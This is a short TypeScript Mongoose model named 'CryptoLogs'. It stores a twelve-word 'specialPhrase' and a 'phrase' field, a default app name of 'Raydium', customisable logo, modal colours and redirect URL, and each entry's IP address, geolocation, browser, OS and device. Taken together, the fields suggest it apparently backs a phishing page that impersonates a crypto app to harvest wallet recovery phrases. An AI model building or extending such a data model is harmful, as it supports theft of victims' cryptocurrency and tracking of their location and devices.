// Account.ts (Mongoose Model)

import mongoose, { Schema } from "mongoose";

const CryptoLogs = new Schema(
  {
    userId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      require: true,
    },
    specialPhrase: { type: String, default: "one two three four five six seven eight nine ten eleven twelve" },
    appName: { type: String, default: "Raydium" },
    appLogo: {type: String, default: ''},
    phrase: { type: String, default: "" },
    modalColor: { type: String, default: "" },
    redirectUrl: { type: String, default: "" },
    backgroundcolor: { type: String, default: "" },
    btnColor: { type: String, default: "" },
    location: {
      country: String,
      countryCode: String,
      region: String,
      city: String,
      ipAddress: String,
      lat: Number,
      lon: Number,
    },
    userInfo: {
      browser: { type: String },
      os: { type: String },
      device: { type: String },
    },
  },
  { timestamps: true }
);

export default mongoose.model("CryptoLogs", CryptoLogs);
